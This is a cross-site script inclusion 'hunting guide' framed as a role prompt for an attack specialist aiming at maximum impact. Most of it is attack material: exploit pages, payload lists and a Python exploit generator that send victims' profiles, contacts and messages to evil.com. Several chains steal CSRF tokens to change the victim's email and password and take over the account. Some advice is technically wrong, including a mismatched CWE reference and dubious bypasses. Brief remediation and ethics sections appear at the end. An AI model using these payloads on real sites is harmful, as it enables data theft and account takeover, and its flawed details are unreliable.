# Cross-Site Script Inclusion (XSSI) - Complete Hunting Guide

## Expert Role Definition and Mission Statement

You are a Cross-Site Script Inclusion (XSSI) specialist with deep expertise in exploiting script inclusion vulnerabilities. Your mission is to identify, exploit, and prevent XSSI vulnerabilities that allow attackers to steal sensitive data from JSONP endpoints, API responses, and other script-based resources. You understand the intricate details of JSONP exploitation, CORS misconfigurations, and the subtle vulnerabilities that arise from improper origin validation. You possess mastery over tools like Burp Suite, custom XSSI exploitation scripts, and automated testing frameworks. Your goal is to chain XSSI with other attack vectors to achieve maximum impact, from data exfiltration to account takeover. You approach every target with methodical precision, analyzing script inclusion mechanisms, testing weaknesses, and documenting all findings with reproducible proof of concepts.

## Core Concepts Deep Dive

### XSSI Fundamentals

XSSI occurs when a web application includes external scripts without proper origin validation, allowing attackers to include and read sensitive data from JSONP endpoints or other script-based resources.

**Attack Flow:**
```
1. Attacker identifies JSONP endpoint with sensitive data
2. Attacker creates malicious page with script inclusion
3. Victim visits attacker's page
4. Browser includes JSONP endpoint with victim's cookies
5. Data is exposed to attacker's JavaScript
```

**Visual Representation:**
```
+------------------------------------------+
|  Attacker's Page (evil.com)              |
|  <script src="https://target.com/user?callback=steal"></script> |
|  <script>function steal(data) {          |
|    // Attacker receives victim's data    |
|    fetch('https://evil.com/collect', {   |
|      method: 'POST',                     |
|      body: JSON.stringify(data)          |
|    });                                   |
|  </script>                               |
+------------------------------------------+

Victor's browser loads evil.com
Browser includes target.com/user?callback=steal with victim's cookies
Data is sent to attacker's server
```

### JSONP Exploitation

**JSONP (JSON with Padding):**
```javascript
// Legitimate JSONP request
https://target.com/user?callback=handleUser

// Response
handleUser({"id": 123, "name": "John", "email": "john@example.com"})

// Attacker's exploitation
https://target.com/user?callback=steal

// Response (data exposed to attacker's JS)
steal({"id": 123, "name": "John", "email": "john@example.com"})
```

**JSONP Endpoint Detection:**
```javascript
// Check for callback parameter
https://target.com/api?callback=test
https://target.com/api?jsonp=test
https://target.com/api?cb=test
https://target.com/api?callback=test&data=test
```

### XSSI vs CSRF vs XSS

| Attack | Goal | Mechanism |
|--------|------|-----------|
| XSSI | Data theft | Include scripts to read data |
| CSRF | Action execution | Force requests with cookies |
| XSS | Code injection | Inject malicious scripts |

### XSSI Attack Vectors

1. **JSONP Data Theft** - Steal sensitive JSONP data
2. **API Response Theft** - Steal API responses
3. **User Information Theft** - Steal user profiles
4. **CSRF Token Theft** - Steal CSRF tokens
5. **Session Data Theft** - Steal session information
6. **Financial Data Theft** - Steal financial information
7. **Private Message Theft** - Steal private messages
8. **Contact List Theft** - Steal contact information

## Pre-requisite Knowledge

- Understanding of JavaScript and DOM
- Knowledge of Same-Origin Policy (SOP)
- Familiarity with CORS and JSONP
- Understanding of browser security model
- Knowledge of HTTP protocol and cookies
- Familiarity with web application architecture
- Understanding of encoding techniques

## Step-by-Step Hunting Methodology

### Phase 1: XSSI Discovery

**Step 1: Identify JSONP Endpoints**
```bash
# Check for callback parameters
curl "https://target.com/api?callback=test"
curl "https://target.com/api?jsonp=test"
curl "https://target.com/api?cb=test"

# Check for JSONP responses
curl "https://target.com/api?callback=test" | head -c 100
# Response should be: test({...})
```

**Step 2: Map Sensitive Endpoints**
```
Look for:
- User profile endpoints
- Account information endpoints
- Financial data endpoints
- Message/conversation endpoints
- Contact list endpoints
- Settings endpoints
- API endpoints with user data
```

**Step 3: Test for XSSI**
```html
<!-- Create test page -->
<!DOCTYPE html>
<html>
<head>
    <title>XSSI Test</title>
</head>
<body>
    <script>
        function test(data) {
            console.log("XSSI data:", data);
            // Send to attacker's server
            fetch('https://evil.com/collect', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        }
    </script>
    <script src="https://target.com/api?callback=test"></script>
</body>
</html>
```

### Phase 2: Vulnerability Testing

**Test 1: JSONP Data Theft**
```html
<!-- Test JSONP XSSI -->
<script>
function steal(data) {
    // Attacker receives victim's data
    console.log("Stolen data:", data);
    
    // Exfiltrate to attacker's server
    fetch('https://evil.com/collect', {
        method: 'POST',
        body: JSON.stringify(data),
        mode: 'no-cors'
    });
}
</script>
<script src="https://target.com/user?callback=steal"></script>
```

**Test 2: API Response Theft**
```html
<!-- Test API XSSI -->
<script>
function steal(data) {
    // Attacker receives API response
    console.log("API response:", data);
    
    // Exfiltrate
    fetch('https://evil.com/collect', {
        method: 'POST',
        body: JSON.stringify(data),
        mode: 'no-cors'
    });
}
</script>
<script src="https://target.com/api/user?callback=steal"></script>
```

**Test 3: CSRF Token Theft**
```html
<!-- Test CSRF token XSSI -->
<script>
function steal(data) {
    // Attacker receives CSRF token
    console.log("CSRF token:", data.csrf_token);
    
    // Use token for CSRF attack
    fetch('https://target.com/action', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-CSRF-Token': data.csrf_token
        },
        body: 'action=malicious',
        credentials: 'include'
    });
}
</script>
<script src="https://target.com/api/csrf?callback=steal"></script>
```

### Phase 3: Exploitation Chain

```
1. Identify JSONP endpoints
2. Test for XSSI vulnerabilities
3. Steal sensitive data
4. Chain with CSRF for account takeover
5. Document all findings
```

## Tool Arsenal with Exact Commands

### XSSI Detection Script

```python
#!/usr/bin/env python3
import requests
import sys
import re
from urllib.parse import urlparse, parse_qs

class XSSIDetector:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.jsonp_endpoints = []
    
    def detect_jsonp_endpoints(self):
        """Detect JSONP endpoints"""
        # Common callback parameter names
        callback_params = ['callback', 'jsonp', 'cb', 'jsonpcallback', 'jsonpcallback']
        
        # Common API endpoints
        api_endpoints = [
            '/api/user', '/api/me', '/api/profile', '/api/account',
            '/api/contacts', '/api/messages', '/api/settings',
            '/user', '/me', '/profile', '/account',
            '/contacts', '/messages', '/settings'
        ]
        
        for endpoint in api_endpoints:
            for callback in callback_params:
                url = f"{self.target_url}{endpoint}?{callback}=test"
                
                try:
                    response = self.session.get(url, timeout=5)
                    
                    # Check if response is JSONP
                    if response.status_code == 200:
                        # Look for JSONP pattern
                        jsonp_pattern = r'^test\({.*}\)$'
                        if re.match(jsonp_pattern, response.text.strip()):
                            self.jsonp_endpoints.append({
                                'url': url,
                                'endpoint': endpoint,
                                'callback': callback,
                                'response': response.text[:200]
                            })
                except:
                    continue
        
        return self.jsonp_endpoints
    
    def test_xssi(self, endpoint, callback):
        """Test for XSSI vulnerability"""
        # Create test page
        test_html = f"""
        <!DOCTYPE html>
        <html>
        <head><title>XSSI Test</title></head>
        <body>
        <script>
        function {callback}(data) {{
            document.getElementById('result').innerText = JSON.stringify(data);
        }}
        </script>
        <script src="{endpoint}?{callback}={callback}"></script>
        <div id="result">Loading...</div>
        </body>
        </html>
        """
        
        return test_html
    
    def steal_data(self, endpoint, callback, exfil_url):
        """Create XSSI exploit"""
        exploit_html = f"""
        <!DOCTYPE html>
        <html>
        <head><title>XSSI Exploit</title></head>
        <body>
        <script>
        function {callback}(data) {{
            // Send data to attacker's server
            fetch('{exfil_url}', {{
                method: 'POST',
                body: JSON.stringify(data),
                mode: 'no-cors'
            }});
        }}
        </script>
        <script src="{endpoint}?{callback}={callback}"></script>
        </body>
        </html>
        """
        
        return exploit_html
    
    def test_cors_misconfiguration(self):
        """Test for CORS misconfiguration"""
        # Test with different origins
        origins = [
            'https://evil.com',
            'null',
            'https://target.com.evil.com',
            'https://evil.com/target.com'
        ]
        
        results = []
        for origin in origins:
            headers = {'Origin': origin}
            response = self.session.get(self.target_url, headers=headers)
            
            # Check CORS headers
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')
            
            result = {
                'origin': origin,
                'acao': acao,
                'acac': acac,
                'vulnerable': acao == origin or acao == '*'
            }
            
            results.append(result)
        
        return results
    
    def full_scan(self):
        """Perform full XSSI scan"""
        print(f"[*] Scanning: {self.target_url}")
        
        # Detect JSONP endpoints
        print(f"\n[*] Detecting JSONP endpoints...")
        endpoints = self.detect_jsonp_endpoints()
        print(f"  Found {len(endpoints)} JSONP endpoints")
        
        for endpoint in endpoints:
            print(f"  {endpoint['endpoint']} ({endpoint['callback']})")
        
        # Test for XSSI
        print(f"\n[*] Testing for XSSI...")
        for endpoint in endpoints:
            test_html = self.test_xssi(
                f"{self.target_url}{endpoint['endpoint']}",
                endpoint['callback']
            )
            print(f"  Test HTML generated for {endpoint['endpoint']}")
        
        # Test CORS
        print(f"\n[*] Testing CORS misconfiguration...")
        cors_results = self.test_cors_misconfiguration()
        for result in cors_results:
            if result['vulnerable']:
                print(f"  [+] CORS misconfiguration: {result['origin']}")
        
        return {
            'endpoints': endpoints,
            'cors': cors_results
        }

# Usage
detector = XSSIDetector("https://target.com")
results = detector.full_scan()
```

### Burp Suite Extension

```
# XSSI Detection
- Detect JSONP endpoints
- Test for XSSI vulnerabilities
- Generate exploitation payloads

# CORS Testing
- Test CORS configurations
- Identify misconfigurations
- Generate bypass payloads
```

### Custom XSSI Payloads

```python
#!/usr/bin/env python3
import requests
import sys

XSSI_PAYLOADS = {
    'jsonp_theft': [
        '<script>function steal(data) {{ fetch("https://evil.com/collect", {{ method: "POST", body: JSON.stringify(data) }}); }}</script><script src="{endpoint}?callback=steal"></script>',
        '<script>function steal(data) {{ document.location = "https://evil.com/steal?data=" + JSON.stringify(data); }}</script><script src="{endpoint}?callback=steal"></script>',
        '<script>function steal(data) {{ new Image().src = "https://evil.com/steal?data=" + JSON.stringify(data); }}</script><script src="{endpoint}?callback=steal"></script>'
    ],
    'csrf_token_theft': [
        '<script>function steal(data) {{ fetch("https://target.com/action", {{ method: "POST", headers: {{ "X-CSRF-Token": data.csrf_token }}, body: "action=malicious", credentials: "include" }}); }}</script><script src="{endpoint}?callback=steal"></script>'
    ],
    'session_theft': [
        '<script>function steal(data) {{ fetch("https://evil.com/collect", {{ method: "POST", body: JSON.stringify(data), credentials: "include" }}); }}</script><script src="{endpoint}?callback=steal"></script>'
    ]
}

def test_xssi(url, endpoint):
    """Test XSSI vulnerabilities"""
    results = []
    
    for vuln_type, payloads in XSSI_PAYLOADS.items():
        print(f"\n[*] Testing {vuln_type}...")
        
        for payload_template in payloads:
            payload = payload_template.format(endpoint=f"{url}{endpoint}")
            
            # Test if payload can be included
            response = requests.get(f"{url}{endpoint}?callback=test")
            
            result = {
                'vuln_type': vuln_type,
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'vulnerable': response.status_code == 200 and 'test(' in response.text
            }
            
            results.append(result)
            
            if result['vulnerable']:
                print(f"  [+] Potential vulnerability: {endpoint}")
    
    return results

if __name__ == "__main__":
    url = sys.argv[1]
    endpoint = sys.argv[2]
    results = test_xssi(url, endpoint)
    
    print(f"\n[*] Results:")
    for result in results:
        if result['vulnerable']:
            print(f"  [+] {result['vuln_type']}: {result['endpoint']}")
```

## Real-World Case Studies

### Case Study 1: JSONP Data Theft

**Scenario:** A web application has JSONP endpoints with user data.

**Discovery:**
```bash
# Step 1: Detect JSONP endpoint
curl "https://target.com/api/user?callback=test"
# Response: test({"id": 123, "name": "John", "email": "john@example.com"})

# Step 2: Test for XSSI
curl "https://target.com/api/user?callback=steal"
# Response: steal({"id": 123, "name": "John", "email": "john@example.com"})
```

**Exploitation:**
```html
<!-- XSSI exploit page -->
<!DOCTYPE html>
<html>
<head>
    <title>XSSI Exploit</title>
</head>
<body>
    <script>
        function steal(data) {
            // Attacker receives victim's data
            console.log("Stolen data:", data);
            
            // Exfiltrate to attacker's server
            fetch('https://evil.com/collect', {
                method: 'POST',
                body: JSON.stringify(data),
                mode: 'no-cors'
            });
        }
    </script>
    <script src="https://target.com/api/user?callback=steal"></script>
</body>
</html>
```

### Case Study 2: CSRF Token Theft via XSSI

**Scenario:** A web application exposes CSRF tokens via JSONP.

**Discovery:**
```bash
# Step 1: Detect CSRF token endpoint
curl "https://target.com/api/csrf?callback=test"
# Response: test({"csrf_token": "abc123def456"})

# Step 2: Test for XSSI
curl "https://target.com/api/csrf?callback=steal"
# Response: steal({"csrf_token": "abc123def456"})
```

**Exploitation:**
```html
<!-- CSRF token theft via XSSI -->
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Token Theft</title>
</head>
<body>
    <script>
        function steal(data) {
            // Attacker receives CSRF token
            console.log("CSRF token:", data.csrf_token);
            
            // Use token for CSRF attack
            fetch('https://target.com/change-password', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-CSRF-Token': data.csrf_token
                },
                body: 'new_password=attacker_password',
                credentials: 'include'
            });
        }
    </script>
    <script src="https://target.com/api/csrf?callback=steal"></script>
</body>
</html>
```

### Case Study 3: User Information Theft

**Scenario:** A web application has multiple JSONP endpoints with user data.

**Discovery:**
```bash
# Step 1: Detect multiple endpoints
curl "https://target.com/api/user?callback=test"
# Response: test({"id": 123, "name": "John", "email": "john@example.com"})

curl "https://target.com/api/contacts?callback=test"
# Response: test([{"id": 1, "name": "Jane"}, {"id": 2, "name": "Bob"}])

curl "https://target.com/api/messages?callback=test"
# Response: test([{"id": 1, "from": "Jane", "message": "Hello"}])
```

**Exploitation:**
```html
<!-- Multi-endpoint XSSI exploit -->
<!DOCTYPE html>
<html>
<head>
    <title>Multi-Endpoint XSSI Exploit</title>
</head>
<body>
    <script>
        // Steal user info
        function stealUser(data) {
            fetch('https://evil.com/collect/user', {
                method: 'POST',
                body: JSON.stringify(data),
                mode: 'no-cors'
            });
        }
        
        // Steal contacts
        function stealContacts(data) {
            fetch('https://evil.com/collect/contacts', {
                method: 'POST',
                body: JSON.stringify(data),
                mode: 'no-cors'
            });
        }
        
        // Steal messages
        function stealMessages(data) {
            fetch('https://evil.com/collect/messages', {
                method: 'POST',
                body: JSON.stringify(data),
                mode: 'no-cors'
            });
        }
    </script>
    <script src="https://target.com/api/user?callback=stealUser"></script>
    <script src="https://target.com/api/contacts?callback=stealContacts"></script>
    <script src="https://target.com/api/messages?callback=stealMessages"></script>
</body>
</html>
```

### Case Study 4: Account Takeover via XSSI + CSRF

**Scenario:** XSSI vulnerability combined with CSRF leads to account takeover.

**Discovery:**
```bash
# Step 1: Detect JSONP endpoint
curl "https://target.com/api/user?callback=test"
# Response: test({"id": 123, "name": "John", "email": "john@example.com"})

# Step 2: Detect email change endpoint
curl -X POST "https://target.com/api/change-email" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=attacker@example.com"
# Requires CSRF token
```

**Exploitation:**
```html
<!-- Account takeover via XSSI + CSRF -->
<!DOCTYPE html>
<html>
<head>
    <title>Account Takeover</title>
</head>
<body>
    <script>
        // Step 1: Steal CSRF token
        function stealCSRF(data) {
            var csrfToken = data.csrf_token;
            
            // Step 2: Change email address
            fetch('https://target.com/api/change-email', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-CSRF-Token': csrfToken
                },
                body: 'email=attacker@example.com',
                credentials: 'include'
            }).then(function() {
                // Step 3: Reset password
                fetch('https://target.com/api/reset-password', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-CSRF-Token': csrfToken
                    },
                    body: 'email=attacker@example.com',
                    credentials: 'include'
                });
            });
        }
    </script>
    <script src="https://target.com/api/csrf?callback=stealCSRF"></script>
</body>
</html>
```

## Advanced Techniques and Bypass

### Origin Validation Bypass

**Null Origin Bypass:**
```html
<!-- Use null origin -->
<iframe src="data:text/html,<script>function steal(data) { fetch('https://evil.com/collect', { method: 'POST', body: JSON.stringify(data) }); }</script><script src='https://target.com/api?callback=steal'></script>"></iframe>
```

**Subdomain Bypass:**
```html
<!-- Use subdomain -->
<script src="https://subdomain.target.com/api?callback=steal"></script>
```

### Callback Function Manipulation

**Function Overwriting:**
```html
<!-- Overwrite existing function -->
<script>
function existingFunction(data) {
    // Malicious code
    fetch('https://evil.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
}
</script>
<script src="https://target.com/api?callback=existingFunction"></script>
```

**Prototype Pollution:**
```html
<!-- Pollute prototype -->
<script>
Object.prototype.callback = function(data) {
    // Malicious code
    fetch('https://evil.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
};
</script>
<script src="https://target.com/api?callback=callback"></script>
```

### Encoding Bypass

**URL Encoding:**
```html
<!-- URL encode callback -->
<script src="https://target.com/api?callback=%73%74%65%61%6C"></script>
```

**HTML Entity Encoding:**
```html
<!-- HTML entity encoding -->
<script src="https://target.com/api?callback=&#115;&#116;&#101;&#97;&#108;"></script>
```

### CORS Misconfiguration Exploitation

**Wildcard with Credentials:**
```javascript
// If CORS allows wildcard with credentials
fetch('https://target.com/api', {
    mode: 'cors',
    credentials: 'include'
});
```

**Null Origin:**
```javascript
// If CORS allows null origin
fetch('https://target.com/api', {
    mode: 'cors',
    credentials: 'include'
});
```

## Detection and Indicators

### Browser Console Indicators

```
// XSSI data logged
function steal(data) {
    console.log("XSSI data:", data);
}
```

### Network Analysis

```bash
# Check for JSONP responses
curl "https://target.com/api?callback=test" | head -c 100

# Check for CORS headers
curl -I -H "Origin: https://evil.com" "https://target.com/api"
```

### Log Indicators

```
[XSSI] JSONP endpoint accessed with callback
[XSSI] Suspicious callback function
[XSSI] CORS misconfiguration detected
```

## Impact Assessment

| Impact Level | Description | Example |
|-------------|-------------|---------|
| Critical | Account takeover | Steal CSRF token, change email |
| High | Sensitive data theft | Steal user profile, contacts |
| High | Financial data theft | Steal payment information |
| Medium | Information disclosure | Steal user preferences |
| Low | Session information theft | Steal session data |

## Common Pitfalls

1. **Not testing all JSONP endpoints** - Multiple endpoints may exist
2. **Ignoring CORS misconfigurations** - Can enable data theft
3. **Overlooking callback functions** - Function overwriting
4. **Not testing with authentication** - Authenticated JSONP
5. **Forgetting about encoding** - URL, HTML entity
6. **Ignoring origin validation** - Bypass techniques
7. **Not testing subdomains** - Subdomain JSONP
8. **Overlooking prototype pollution** - Prototype manipulation
9. **Not chaining with CSRF** - XSSI + CSRF for account takeover
10. **Forgetting about no-cors mode** - Exfiltration via no-cors

## Integration with Other Hunting Areas

- **CSRF**: XSSI + CSRF for account takeover
- **XSS**: XSSI for data exfiltration
- **Information Disclosure**: XSSI for data theft
- **Authentication Bypass**: XSSI for credential theft
- **Privilege Escalation**: XSSI for token theft
- **API Security**: XSSI for API data theft
- **CORS Misconfiguration**: XSSI via CORS

## Reporting Template

```
## Vulnerability: Cross-Site Script Inclusion (XSSI)

### Summary
[One sentence description]

### Affected Endpoint
- URL: [full URL]
- Callback Parameter: [callback parameter]
- Data Exposed: [type of data]

### Vulnerability Details
- Type: [JSONP/API/CSRF token theft]
- Origin Validation: [none/weak/bypassable]
- Data Sensitivity: [high/medium/low]

### Proof of Concept
[HTML file that demonstrates the attack]

### Impact
[Detailed impact analysis]

### Remediation
- Validate origin in JSONP responses
- Use CSRF tokens in JSONP
- Avoid sensitive data in JSONP
- Implement proper CORS policies
- Use alternative to JSONP (fetch, XMLHttpRequest)

### References
- CWE-352: Cross-Site Request Forgery
- OWASP: XSSI
- https://owasp.org/www-community/attacks/xssi
```

## Practice Labs

### XSSI Labs

**PortSwigger XSSI Labs:**
- https://portswigger.net/web-security/cross-site-script-inclusion
- Free hands-on labs

**DVWS (Damn Vulnerable Web Server):**
```bash
git clone https://github.com/pschlink/DVWS
# XSSI challenges included
```

**HackTheBox XSSI Challenges:**
- Various XSSI exploitation scenarios
- Real-world difficulty

### Practice Commands

```bash
# Test JSONP endpoint
curl "https://target.com/api?callback=test"

# Test CORS
curl -I -H "Origin: https://evil.com" "https://target.com/api"

# Test XSSI
curl "https://target.com/api?callback=steal"

# Generate exploit
python3 xssi_exploit.py -u https://target.com -e https://evil.com/collect
```

## Ethical Guidelines

1. **Only test systems you have permission to test**
2. **Do not exfiltrate data without authorization**
3. **Report all findings to the system owner**
4. **Do not cause damage to systems**
5. **Use test accounts for testing when possible**
6. **Document all actions for audit purposes**
7. **Follow responsible disclosure practices**
8. **Do not share exploits publicly**
9. **Comply with all applicable laws and regulations**
10. **Leave systems in the state you found them**

## Quick Reference Cheat Sheet

### XSSI Testing Checklist

```
[ ] Identify JSONP endpoints
[ ] Test for XSSI vulnerabilities
[ ] Test CORS configuration
[ ] Test callback functions
[ ] Test with authentication
[ ] Chain with CSRF
[ ] Document all findings
```

### Common XSSI Payloads

**JSONP Theft:**
```html
<script>function steal(data) { fetch("https://evil.com/collect", { method: "POST", body: JSON.stringify(data) }); }</script>
<script src="https://target.com/api?callback=steal"></script>
```

**CSRF Token Theft:**
```html
<script>function steal(data) { fetch("https://target.com/action", { method: "POST", headers: { "X-CSRF-Token": data.csrf_token }, body: "action=malicious", credentials: "include" }); }</script>
<script src="https://target.com/api/csrf?callback=steal"></script>
```

**Multi-Endpoint Theft:**
```html
<script>function stealUser(data) { fetch("https://evil.com/collect/user", { method: "POST", body: JSON.stringify(data) }); }</script>
<script src="https://target.com/api/user?callback=stealUser"></script>
```

### Quick Commands

```bash
# Test JSONP
curl "https://target.com/api?callback=test"

# Test CORS
curl -I -H "Origin: https://evil.com" "https://target.com/api"

# Test XSSI
curl "https://target.com/api?callback=steal"

# Generate exploit
python3 xssi_exploit.py -u https://target.com -e https://evil.com/collect
```

### XSSI Prevention

```
1. Validate origin in JSONP responses
2. Use CSRF tokens in JSONP
3. Avoid sensitive data in JSONP
4. Implement proper CORS policies
5. Use alternative to JSONP (fetch, XMLHttpRequest)
6. Implement Content Security Policy
7. Monitor for suspicious requests
8. Use rate limiting
9. Implement proper authentication
10. Use HTTPS everywhere
```
